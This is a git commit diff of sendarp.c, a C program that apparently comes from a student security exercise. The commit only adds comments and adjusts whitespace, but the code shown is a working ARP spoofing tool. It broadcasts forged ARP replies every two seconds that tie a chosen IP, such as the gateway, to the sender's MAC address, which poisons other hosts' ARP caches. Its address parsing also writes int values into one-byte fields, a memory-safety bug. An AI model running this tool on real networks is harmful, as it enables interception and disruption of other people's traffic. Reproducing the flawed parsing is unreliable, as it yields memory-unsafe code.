4ad2d0ca0ad79cbc4e6340481b2f53f8589a5d30
Kim Howon <lightorb25@gmail.com>
2018-08-07 17:58:25 +0900

    modified jjoo suk

--- sendarp.c
+++ sendarp.c
@@ -3,7 +3,6 @@
 #include <string.h>
 #include <unistd.h>
 #include <arpa/inet.h>
-#include <signal.h>
 #include <sys/socket.h>
 #include <net/ethernet.h>
 #include <net/if.h>
@@ -20,20 +19,19 @@ int main(int argc, char ** argv)
    struct sockaddr_ll device;
    struct ether_header * eth = (struct ether_header *) packet;
    struct ether_arp * arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
-   
+   //argc
    if (argc < 4) 
    {
       printf("Usage: ./sendarp <interface> <source ip address(maybe gateway)> <target ip address>");
     exit(1);
    }
-
+   //Socket open
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0)
    {
      perror("socket");
      exit(1);
    }
-
    //get my interface mac address
    struct ifreq req;
    memset(&req,0,sizeof(req));
@@ -48,23 +46,20 @@ int main(int argc, char ** argv)
    {
 	   arp->arp_sha[i] = req.ifr_hwaddr.sa_data[i];
    }
-    
    //Source Protocol Address : ARP Packet
    sscanf(argv[2], "%d.%d.%d.%d", (int *) &arp->arp_spa[0],
                            (int *) &arp->arp_spa[1],
                            (int *) &arp->arp_spa[2],
                            (int *) &arp->arp_spa[3]);
-
+   //Target Protocol Address : ARP Packet
    sscanf(argv[3], "%d.%d.%d.%d.", (int *) &arp->arp_tpa[0],
 		   	(int *) &arp->arp_tpa[1],
 			(int *) &arp->arp_tpa[2],
 			(int *) &arp->arp_tpa[3]);
-
    //Ethernet Packet
    memset(eth->ether_dhost, 0xff , ETH_ALEN); //destination address
    memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN); //source address
    eth->ether_type = htons(ETH_P_ARP);    //type
-
    //ARP Packet
    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);  //Format of hardware address
    arp->ea_hdr.ar_pro = htons(ETH_P_IP);   //Format of protocol address.
@@ -72,15 +67,16 @@ int main(int argc, char ** argv)
    arp->ea_hdr.ar_pln = 4;      //Length of protocol address.
    arp->ea_hdr.ar_op = htons(ARPOP_REPLY);  //ARP operation : REPLY
    memset(arp->arp_tha, 0xff, ETH_ALEN);   //Target hardware address.
-
+   //Device information
    memset(&device, 0, sizeof(device));
    device.sll_ifindex = if_nametoindex(argv[1]);  //Interface number 
    device.sll_family = AF_PACKET;     
    memcpy(device.sll_addr, arp->arp_sha, ETH_ALEN); //Physical layer address
    device.sll_halen = htons(ETH_ALEN);    //Length of address
-
+   //Send ARP packet
    printf("Press Ctrl+C to stop \n");
-   while (1) {
+   while (1) 
+   {
      printf("send to %s on %s : %s\n",argv[3], argv[2], argv[1]);
      sendto(sock, packet, PACKET_LEN, 0, (struct sockaddr *) &device, sizeof(device));
      sleep(2);
